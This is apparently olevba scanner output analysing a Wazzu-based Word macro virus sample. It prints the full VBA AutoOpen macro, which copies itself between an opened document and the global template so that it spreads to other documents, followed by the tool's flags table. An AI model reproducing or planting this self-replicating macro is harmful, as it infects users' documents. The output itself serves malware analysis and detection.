olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-9bd755de96ae4bd90e4dfe77e284fa5d0a3aa96e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO aUTOOpen 
in file: Virus.MSWord.Wazzu-based-9bd755de96ae4bd90e4dfe77e284fa5d0a3aa96e - OLE stream: 'aUTOOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim f1$
Dim g1$
WordBasic.FileSummaryInfo Update:=1
Dim d1 As Object: Set d1 = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo d1
f1$ = d1.Directory + "\" + d1.FileName + ":aUTOOpen"
g1$ = "Global:aUTOOpen"
If UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 4)) = ".DOT" Then
WordBasic.MacroCopy g1$, f1$
WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy f1$, g1$
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Wazzu-based-9bd755de96ae4bd90e4dfe77e284fa5d0a3aa96e - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUTOOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

